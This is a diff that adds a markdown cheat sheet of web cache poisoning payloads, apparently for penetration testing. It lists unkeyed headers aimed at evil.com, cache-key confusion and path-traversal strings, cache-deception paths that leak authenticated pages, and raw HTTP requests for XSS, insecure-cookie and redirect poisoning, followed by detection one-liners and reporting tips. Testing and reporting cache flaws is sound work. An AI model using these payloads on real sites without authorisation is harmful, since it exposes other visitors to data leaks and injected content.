@@ -1,0 +1,117 @@
+# Web Cache Poisoning Payloads
+
+## UNKEYED HEADER MATRIX (paste into Burp Match&Replace or manual)
+
+Test every page with each header; mark if the value appears in the response.
+
+```
+X-Forwarded-Host: evil.com
+X-Forwarded-Proto: http
+X-Forwarded-Scheme: http
+X-Original-URL: /admin/
+X-Rewrite-URL: /admin/
+X-Forwarded-Url: http://evil.com
+X-HTTP-Method-Override: GET
+X-Forwarded-For: evil.com
+X-Host: evil.com
+X-Original-Host: evil.com
+Forwarded: host=evil.com
+Forwarded: for=evil.com;host=evil.com;proto=http
+X-Forwarded-Server: evil.com
+X-Proxy-Host: evil.com
+X-Remote-IP: evil.com
+X-Client-IP: evil.com
+Origin: https://evil.com
+Referer: https://evil.com/
+cookie: session=evil
+Cookie: something=evil; usertype=admin
+```
+Golden unkeyed headers to test first on most sites:
+```
+X-Forwarded-Host
+X-Forwarded-Proto
+X-Original-URL
+X-Forwarded-Host: evil.com
+X-Rewrite-URL
+```
+If `X-Original-URL: /admin/` → cache serves `/admin/` content to requests for `/` → cache poisoning + access control bypass.
+
+## QUERY KEY CONFUSION (cache key != what app parses)
+```
+/?cb=1
+/?cb=1&cb=2                 (parameter pollution)
+/?cb=1%00                  (null byte)
+/?cb=1%0d%0a
+/?cb=1%2f2
+/?cb=1.js
+/?cb=1&
+/?cb=1#fragment
+/?cb=1?cb=2
+/?news%2f..%2f           (dot-dot after path)
+/home/../admin
+//admin/home/
+```
+Purpose: see if you can make the origin see a DIFFERENT path than the cache key records → serve a URL the cache treats as different.
+
+## CACHE DECEPTION (leak private data into cache)
+Common "cacheable but reflects auth data" paths:
+```
+GET /account      → 200 (private)
+GET /account/nonexistent.js     (make cache think static file)
+GET /account/../../static.js
+GET /account%2f..%2f.js
+GET /account?cb=1
+GET /account/;../../foo.js
+GET /account.json
+GET /account/..
+GET /account/%2e%2e/..%2f..%2fstatic.css
+```
+If the cached response includes authenticated page (e.g. /account with CSRF token / email / billing) then a victim request to the poisoned URL leaks THEIR data to whoever requests it next.
+
+## HEADER-BASED XSS POISON (proof of concept)
+```
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+```
+Response contains `<link href="//evil.com/assets/site.css">` → all visitors receive page linking evil CSS → mark injectable.
+
+Poison `X-Forwarded-Scheme` to flip cookies/links:
+```
+GET /set-cookie HTTP/1.1
+Host: target.com
+X-Forwarded-Scheme: http
+```
+If a `Set-Cookie: Secure` is downgraded because scheme says http → session cookie sent over plain → session theft.
+
+## CACHEABLE STATIC FEED + UNKEYED COOKIE
+```
+GET /sitemap.xml HTTP/1.1
+Host: target.com
+Cookie: lang=en;session=evil
+```
+If `sitemap.xml` content changes on cookie and is cached (cache key lacks cookie) → poison by cookie → all visitors served attacker variant.
+
+## OPEN-REDIRECT POISON
+```
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Proto: http
+```
+Redirect responses (`302`) that include unkeyed host in `Location:` → cache the redirect → everyone goes to evil.
+
+## EXTRACTING THE CACHE KEY (fingerprint)
+Try two requests differing in one header/param; if 2nd serves the 1st's body, that input is NOT in the cache key (it's a candidate attack surface).
+
+## Tools one-liner (Param Miner style via nuclei)
+```
+nuclei -t http/misconfiguration -u https://target.com -rl 50
+# then check exposed-cache headers
+curl -sI https://target.com/ | grep -iE 'cdn-cache|x-cache|age|via'
+```
+Look for `Age:` / `X-Cache: HIT/MISS` to know a cache is in the path at all.
+
+## Reporting
+- Always show cache HIT proof: `Age: 124` / `X-Cache: HIT` header in the poisoned response.
+- If it's only `MISS` it may not be cached — verify with 2 requests and `Age` delta.
+- Severity: reflected XSS via cache poison on a global path = Critical.
